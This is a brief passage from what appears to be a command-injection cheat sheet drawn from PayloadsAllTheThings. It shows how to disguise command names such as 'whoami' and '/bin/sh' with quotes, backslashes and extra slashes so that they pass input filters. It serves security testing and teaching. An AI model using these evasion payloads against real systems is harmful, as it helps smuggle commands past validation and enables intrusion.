# using single quotes in command names
$ w'h'o'am'i
# using double quotes in command names
$ w"h"o"am"i
# using backslashes and slahes in command names
$ w\ho\am\i
$ /\b\i\n/////s\h
```

# References

- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
